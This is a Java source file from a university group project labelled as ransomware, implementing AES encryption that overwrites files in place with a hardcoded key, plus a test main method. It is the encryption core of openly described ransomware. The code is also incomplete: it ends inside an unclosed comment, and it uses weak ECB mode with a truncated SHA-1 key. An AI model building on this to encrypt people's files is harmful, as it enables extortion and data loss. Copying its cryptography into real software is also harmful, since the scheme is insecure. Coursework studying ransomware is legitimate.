//Author: Derek Francis
// EECS 3481 Group Project - Ransomware
// This class Implements the AES encyption algorithm

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Scanner;
import java.nio.file.Files;
import java.nio.file.Paths;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
 
public class AESClass {
 
    private static SecretKeySpec secretKey; 
    private static byte[] key;
    public static byte[] plaintext  ;
    public static byte[] encryptedText  ;
    public static byte[] decryptedText  ;
 
    // The method reads in a string (that has been read from a file), encrypts it and prints out the contents to the same file. 
    public static void encrypt(byte[] strToEncrypt, String secret, File file ) 
    {
    	
    	byte[] encryptedText; 
        try
        {
            setKey(secret);
            Cipher cipherAES = Cipher.getInstance("AES/ECB/PKCS5Padding");
          //  Cipher cipherAES = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipherAES.init(Cipher.ENCRYPT_MODE, secretKey);
            
         // encryptedText =  Base64.getEncoder().encodeToString(cipherAES.doFinal(strToEncrypt));//strToEncrypt.getBytes("UTF-8"))); 
           encryptedText = cipherAES.doFinal(strToEncrypt) ;
           
 
   		try {
   			
   			Files.write(file.toPath(), encryptedText);

   		} catch (IOException e) {
   			// TODO Auto-generated catch block
   			e.printStackTrace();
   		}
        } 
        catch (Exception e) 
        {
            System.out.println("Error while encrypting: " + e.toString());
        }
    
      
        // Write all the encrypted content back in to the file 
    }
 
 // The method reads in a string (that has been read from an encrypted file), decrypts it and prints out the contents to the same file.
    public static void decrypt(byte[] strToDecrypt, String secret, File file) 
    {
    	
    	
        try
        {
            setKey(secret);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
           // Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            decryptedText = cipher.doFinal(strToDecrypt);
        } 
        catch (Exception e) 
        {
            System.out.println("Error while decrypting: " + e.toString());
        }
        
      //  BufferedWriter output ; 
        BufferedWriter output ; 
   		try {
   		   Files.write(file.toPath(), decryptedText);
   		   
   		} catch (IOException e) {
   			// TODO Auto-generated catch block
   			e.printStackTrace();
		} 
    }
    
    // This method creates the aes key based on the secret key variable in the main method
    
    public static void setKey(String myKey) 
    {
        MessageDigest sha = null;
        try {
            key = myKey.getBytes("UTF-8");
            sha = MessageDigest.getInstance("SHA-1");
            key = sha.digest(key);
            key = Arrays.copyOf(key, 16); 
            secretKey = new SecretKeySpec(key, "AES");
        } 
        catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } 
        catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
    
    public static byte[] readFile (File file) {
    	
   
        String originalString="";
    
		String filepath;

			try {
				
				plaintext = Files.readAllBytes(Paths.get(file.getAbsolutePath()));
				//ct = new byte [plaintext.length];
				originalString = Base64.getEncoder().encodeToString(plaintext);
				
			}catch (IOException e) {
	            e.printStackTrace();
	        }
			
			return plaintext;
			
    }

    
    // This main method can be looked as test bed for the aes algorithm
   
    
    public static void main(String[] args) 
    {
    	
    	String FilePath = "C:\\Users\\produ\\Desktop\\assignment\\arduino.exe"; 
    	final String secretKey = "This is a very secret key!";
    	File Folder = new File (FilePath) ; 
    	 //String fileContent = readFile(FilePath) ; 
    	 //encrypt(fileContent, secretKey, FilePath);
        File[] filesArray = Folder.listFiles() ; 
        
    	//for (int i = 0; i < filesArray.length; i++) {
    		//File j = filesArray[i] ; 
    		byte[] content = AESClass.readFile(Folder);
    	    decrypt(content, secretKey, Folder); 
    	//}
    	
    	// to decrypt 
    	
     /*
            
    }
               
    
}